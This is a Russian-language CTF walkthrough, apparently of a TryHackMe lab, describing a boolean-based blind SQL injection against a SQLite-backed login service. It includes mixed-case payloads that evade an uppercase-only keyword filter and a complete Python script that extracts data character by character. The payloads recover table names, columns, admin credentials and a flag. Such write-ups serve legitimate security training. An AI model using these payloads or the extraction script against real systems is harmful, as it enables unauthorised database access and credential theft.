Краткое введение в задание:
```
Я работаю над приложением для работы с базами данных под названием Light! Хотите попробовать?  
Если да, то приложение работает на порту 1337. Вы можете подключиться к нему с помощью nc 10.113.130.54 1337  
Для начала вы можете использовать имя пользователя smokey .
```

Подключаемся и смотрим логику взаимодействия.
```
1) Мы пишем туда логин
2) Приложение нам отправляет пароль от него
```

В задании просят ввести имя пользователя smokey. Приложение возвращает нам его пароль. Далее я попробовал admin, но ничего не вышло.
Затем я попробовал сломать синтаксис SQL и вызвать ошибку. Когда я отправил ', синтаксис сломался и появилась ошибка SQL. Это 100% подтверждение SQL инъекции.

![](../images/Pasted%20image%2020260615001309.png)

Далее, так как мы видим одно поле, я предположил, что тут возможна union инъекция, начал проверять. Но стандартные запросы приложение блокировало. Слова UNION и другие были запрещены, также как и любые комментарии.

Позже я заметил, что системы вычисления опасных слов очень примитивная и ищет слово только из больших букв, таким образом, поменяв одну букву на другой регистр, приложение перестаёт видеть какую-либо опасность.

![](../images/Pasted%20image%2020260615002001.png)

Осталось понять, что делать с запрещенными комментариями. Надо как-то грамотно встроиться в запрос без комментариев.
Я попробовал эту конструкцию, чтобы завершить правильно запрос:
```
' UnION SeLECT 1 AND '1'='1
```

После этого у меня получилось обойти ограничение комментариев, мне не надо было больше отсекать хвост SQL запроса.

Следующим этап нужно было узнать сколько столбцов выводит на экран, для грамотной UNION. Логично было, что там 1 столбец, но проверить надо было. Ошибка не триггерилась только когда был 1 столбец.

![](../images/Pasted%20image%2020260615002020.png)

Далее я захотел узнать версию БД.
```
' UnION SeLECT @@version AND '1'='1
```

Но на экран выводилась не та информация, которую я бы хотел, ведь оказалось это boolean SQL-инъекция.

При положительном ответе на SQL запрос приложение возвращает Password: 1, а при отрицательном Username not found.

Введи sqlite_version() можно узнать, что это реально SQLite, но пока непонятно какая версия.

![](../images/Pasted%20image%2020260615002724.png)

Следующими запросами можно понять сколько символов в строке версии:
```
' UnION SeLECT 1 WhERE (SeLECT substr(sqlite_version(),1,1)='3') AnD '1'='1
' UnION SeLECT 1 WhERE (SeLECT substr(sqlite_version(),2,1)='.') AnD '1'='1
' UnION SeLECT 1 WhERE (SeLECT substr(sqlite_version(), 7, 1) != '') AnD '1'='1
```

На 7 символ, приложение ответило отрицательно.

![](../images/Pasted%20image%2020260615003315.png)

Можно сделать вид, что версия БД имеет вид:
```
3.xxxx
```

Далее, чтобы автоматизировать взаимодействие с приложением я написал скрипт на пайтоне. Этот скрипт автоматически подставлял в нужное место символы - цифры, буквы мелкие, большие, спецсимволы и выводил всё посимвольно и в общей картинке на экран.

Вот скрипт который это делает:
```
#!/usr/bin/env python3
import socket
import time
HOST = "10.113.130.54"
PORT = 1337
CHARS = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ._{}"
TEMPLATE = "' UnION SeLECT 1 WhERE (SeLECT substr(sqlite_version(),{pos},1) = '{ch}') AnD '1'='1"
def test_char(pos: int, ch: str) -> bool:
    username = TEMPLATE.format(pos=pos, ch=ch)
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(3)
        s.connect((HOST, PORT))
        
        data = b""
        while b"Please enter your username:" not in data:
            chunk = s.recv(1024)
            if not chunk:
                break
            data += chunk
        
        s.sendall(username.encode() + b"\n")
        
        response = s.recv(1024).decode(errors='ignore')
        s.close()
        
        return "Password: 1" in response
    except Exception:
        return False
def extract_string() -> str:
    pos = 1
    result = ""
    while True:
        found_char = None
        for ch in CHARS:
            if test_char(pos, ch):
                found_char = ch
                break
            time.sleep(0.05)
        
        if found_char is None:
            break
        result += found_char
        print(f"  Позиция {pos:2d}: '{found_char}'")
        pos += 1
        time.sleep(0.1)
    return result
if __name__ == "__main__":
    print("Извлечение версии SQLite...")
    version = extract_string()
    print(f"\n✅ Полная версия: {version}")
```

Запускаем и получаем версию SQLite 3.31.1

![](../images/Pasted%20image%2020260615011034.png)

Далее пойдем по изучению всей БД. Чтобы получить имена баз данных (файлов), используется **`PRAGMA database_list`**

Запрос SQL который я использовал в пайтон коде на этом этапе:
```
Для первой БД
' UNION SELECT 1 WHERE (SELECT substr(name,{pos},1) FROM pragma_database_list LIMIT 0,1) = '{ch}' AND '1'='1

Для второй БД (возможно пользовательская какая-то)
' UNION SELECT 1 WHERE (SELECT substr(name,{pos},1) FROM pragma_database_list LIMIT 1,1) = '{ch}' AND '1'='1
```
Тут я узнал, что имя БД main. А другой БД нету. Стандартная ситуация для SQLite.

![](../images/Pasted%20image%2020260615011746.png)

Запросами:
```
' UnION SeLECT 1 WhERE (SeLECT substr(name,{pos},1) FROM sqlite_master WHERE type='table' LIMIT 0,1) = '{ch}' AnD '1'='1

' UnION SeLECT 1 WhERE (SeLECT substr(name,{pos},1) FROM sqlite_master WHERE type='table' LIMIT 1,1) = '{ch}' AnD '1'='1
```

Я вытянул имя таблиц в БД. Оказалось там две таблицы usertable и admintable.

![](../images/Pasted%20image%2020260615012211.png)

Далее вытаскиваем колонки из таблиц:
```
' UnION SeLECT 1 WhERE (SeLECT substr(name,{pos},1) FROM pragma_table_info('usertable') LIMIT 0,1) = '{ch}' AnD '1'='1
```
Первым по очереди изучаем usertable.
Столбцы которые мы вытащили:
```
id, username, password
```

В admintable оказались те же поля.

![](../images/Pasted%20image%2020260615012833.png)

Ну обычные пользователи нам не нужны, поэтому идем искать имя пользователя администратора
Тут нам поможет следующий запрос:
```
' UnION SeLECT 1 WhERE (SeLECT substr(username,{pos},1) FROM admintable LIMIT 0,1) = '{ch}' AnD '1'='1
```

Запускаем скрипт и вытягиваем имя администратора.

![](../images/Pasted%20image%2020260615013409.png)

Далее вытаскиваем пароль 
```
' UnION SeLECT 1 WhERE (SeLECT substr(password,{pos},1) FROM admintable WHERE username='TryHackMeAdmin') = '{ch}' AnD '1'='1
```

![](../images/Pasted%20image%2020260615013814.png)

Но также нам по заданию необходимо найти флаг, для этого я вернулся к таблице usertable

![](../images/Pasted%20image%2020260615014140.png)

Но она была не единственная
Пользователи которых удалось вытащить:
```
alice
rob
john
michael
smokey
hazel
```

Потом я понял, что их как-то многовато (их там могло быть и 10 и 20 и 1000), поэтому решил проверить, есть ли другие пользователи среди администраторов.

И увидел на второй строке пользователя с именем flag.

![](../images/Pasted%20image%2020260615014633.png)

В поле пароля пользователя flag достаем флаг

